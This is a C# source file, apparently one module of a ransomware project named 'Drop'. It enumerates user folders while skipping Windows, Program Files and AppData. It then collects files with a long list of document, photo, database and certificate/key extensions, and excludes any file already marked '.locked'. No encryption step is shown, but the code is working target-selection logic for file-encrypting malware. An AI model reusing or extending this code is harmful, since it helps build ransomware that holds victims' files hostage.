/**************************************************************************\
Copyright (c) 2018 Nirex.0@Gmail.Com

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
\**************************************************************************/


using System;
using System.IO;

namespace Drop.FileManager
{
    public class NManager
    {
        private string files;

        /// <summary>
        /// Gets all files in all the directories given as the first parameter.
        /// </summary>
        /// <param name="directories">Directory paths to search in</param>
        /// <returns>An array of all found files</returns>
        public string[] GetFiles(string[] directories)
        {
            string[] splitstr = new string[1];
            splitstr[0] = "\n";

            string retStr = string.Empty;
            foreach (string dir in directories)
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    retStr += file + "\n";
                }
            }

            return retStr.Split(splitstr, StringSplitOptions.RemoveEmptyEntries);
        }

        /// <summary>
        /// Searches for the files with a specific format.
        /// </summary>
        /// <param name="directories">Directory paths to search in</param>
        /// <returns>An array of all the found files</returns>
        static string[] DeepSearch(string[] directories)
        {
            string[] splitstr = new string[1];
            splitstr[0] = "\n";

            string outstr = string.Empty;
            foreach (string directory in directories)
            {
                foreach (string file in Directory.GetFiles(directory))
                {
                    if (!file.Contains(".locked"))
                    {
                        if (file.Contains(".pdf") ||
                            file.Contains(".png") ||
                            file.Contains(".odt") ||
                            file.Contains(".ods") ||
                            file.Contains(".odp") ||
                            file.Contains(".odm") ||
                            file.Contains(".odc") ||
                            file.Contains(".odb") ||
                            file.Contains(".wps") ||
                            file.Contains(".xls") ||
                            file.Contains(".xlsx") ||
                            file.Contains(".xlsm") ||
                            file.Contains(".xlsb") ||
                            file.Contains(".xlk") ||
                            file.Contains(".ppt") ||
                            file.Contains(".pptx") ||
                            file.Contains(".pptm") ||
                            file.Contains(".mdb") ||
                            file.Contains(".accdb") ||
                            file.Contains(".pst") ||
                            file.Contains(".dwg") ||
                            file.Contains(".dxf") ||
                            file.Contains(".dxg") ||
                            file.Contains(".wpd") ||
                            file.Contains(".rtf") ||
                            file.Contains(".wb2") ||
                            file.Contains(".mdf") ||
                            file.Contains(".dbf") ||
                            file.Contains(".psd") ||
                            file.Contains(".pdd") ||
                            file.Contains(".eps") ||
                            file.Contains(".ai") ||
                            file.Contains(".indd") ||
                            file.Contains(".cdr") ||
                            file.Contains(".jpg") ||
                            file.Contains(".doc") ||
                            file.Contains(".jpe") ||
                            file.Contains(".dng") ||
                            file.Contains(".3fr") ||
                            file.Contains(".arw") ||
                            file.Contains(".srf") ||
                            file.Contains(".sr2") ||
                            file.Contains(".bay") ||
                            file.Contains(".crw") ||
                            file.Contains(".cr2") ||
                            file.Contains(".dcr") ||
                            file.Contains(".kdc") ||
                            file.Contains(".erf") ||
                            file.Contains(".mef") ||
                            file.Contains(".mrw") ||
                            file.Contains(".nef") ||
                            file.Contains(".nrw") ||
                            file.Contains(".orf") ||
                            file.Contains(".raf") ||
                            file.Contains(".raw") ||
                            file.Contains(".rwl") ||
                            file.Contains(".rw2") ||
                            file.Contains(".r3d") ||
                            file.Contains(".ptx") ||
                            file.Contains(".pef") ||
                            file.Contains(".srw") ||
                            file.Contains(".x3f") ||
                            file.Contains(".der") ||
                            file.Contains(".cer") ||
                            file.Contains(".crt") ||
                            file.Contains(".pem") ||
                            file.Contains(".pfx") ||
                            file.Contains(".p12") ||
                            file.Contains(".p7b") ||
                            file.Contains(".p7c") ||
                            file.Contains(".docx") ||
                            file.Contains(".docm") ||
                            file.Contains(".lnk"))
                        {
                            outstr += file + "\n";
                        }
                    }
                }
            }
            return outstr.Split(splitstr, StringSplitOptions.RemoveEmptyEntries);
        }

        /// <summary>
        /// Searches for all the folders in the given path.
        /// </summary>
        /// <param name="path">The path to search in</param>
        /// <returns>An array of all the found folders</returns>
        public string[] GetAllFolders(string path)
        {
            string[] splitstr = new string[1];
            splitstr[0] = "\n";

            foreach (string f in Directory.GetDirectories(path))
            {
                if (
                    HasWritePermissionOnDir(f)
                    && !f.Contains("Windows")
                    && !f.Contains("Program Files")
                    && !f.Contains("Program Files (x86)")
                    && !f.Contains("ProgramData")
                    && !f.Contains("AppData")
                    && !f.Contains("Microsoft")
                    && !f.Contains("All Users")
                    )
                {
                    files += f + "\n";
                    GetAllFolders(f);
                }
            }
            return files.Split(splitstr, StringSplitOptions.RemoveEmptyEntries);
        }

        /// <summary>
        /// Determines whether or not you can look into a file and make changes
        /// </summary>
        /// <param name="path">Folder to check</param>
        /// <returns>The permission</returns>
        private bool HasWritePermissionOnDir(string path)
        {
            try
            {
                Directory.GetDirectories(path);
                return true;
            }
            catch (UnauthorizedAccessException)
            {
                return false;
            }
            catch
            {
                return false;
            }
        }
    }
}